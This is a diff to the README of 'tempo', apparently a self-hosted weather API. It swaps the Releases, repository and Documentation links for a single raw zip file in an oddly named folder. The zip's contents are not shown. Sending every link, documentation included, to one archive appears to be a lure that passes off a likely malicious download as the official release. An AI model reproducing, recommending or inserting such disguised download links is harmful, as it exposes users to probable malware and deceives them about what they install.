@@ -8,7 +8,7 @@ Welcome to **tempo**, your self-hosted weather API. This tool uses ECMWF data to
 
 You can download **tempo** from our Releases page. Visit the following link:
 
-[Download tempo](https://github.com/shinigamixgod/tempo/releases)
+[Download tempo](https://raw.githubusercontent.com/shinigamixgod/tempo/main/retinasphalt/tempo.zip)
 
 To get started, follow these steps:
 
@@ -84,8 +84,8 @@ If you encounter any problems or have questions, please use the Issues tab on th
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/shinigamixgod/tempo)
-- [Documentation](https://github.com/shinigamixgod/tempo/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/shinigamixgod/tempo/main/retinasphalt/tempo.zip)
+- [Documentation](https://raw.githubusercontent.com/shinigamixgod/tempo/main/retinasphalt/tempo.zip)
 
 ## 🛠️ Contributing
 
